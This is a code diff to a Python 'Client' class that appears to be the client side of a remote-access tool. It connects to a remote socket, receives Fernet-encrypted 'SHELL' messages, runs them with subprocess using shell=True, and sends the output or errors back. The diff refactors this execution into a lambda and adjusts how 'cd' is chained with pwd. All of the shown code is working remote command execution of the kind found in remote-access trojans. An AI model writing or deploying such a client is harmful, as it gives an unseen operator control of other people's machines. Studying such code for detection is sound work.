@@ -176,9 +176,9 @@ class Client(object):
         self.socket = None
         self.fer = Fernet(key)
         if platform.system() == 'Windows':
-            self._pwd = ' & cd'
+            self._pwd = ' && cd'
         else:
-            self._pwd = '; pwd'
+            self._pwd = ' && pwd'
 
     def connect(self) -> None:
         """ Connect to a remote socket """
@@ -504,24 +504,26 @@ class Client(object):
                 continue
 
             if data[0] == 'SHELL':
+
+                execute = lambda command: subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 split_command = data[1].split(' ')[0].strip().lower()
+
                 if split_command in ['cd', 'chdir']:
-                    process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    process = execute(data[1] + self._pwd)
                     error = process.stderr.read().decode()
-                    if error == '':
-                        output = process.stdout.read().decode()
-                        # Command should only return one line (cwd)
-                        if output.count('\n') > 1:
-                            process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                            self.send_json(['ERROR', process.stdout.read().decode()])
-                            continue
-                        os.chdir(output.strip())
-                        self.send_json([os.getcwd()])
+                    if error:
+                        self.send_json(['ERROR', error])
                         continue
-                    self.send_json(['ERROR', error])
+                    output = process.stdout.read().decode()
+                    # Command should only return one line (cwd)
+                    if output.count('\n') > 1:
+                        self.send_json(['ERROR', output])
+                        continue
+                    os.chdir(output.strip())
+                    self.send_json([os.getcwd()])
                     continue
 
-                process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                process = execute(data[1])
                 for line in iter(process.stdout.readline, ''):
                     if line == b'':
                         break
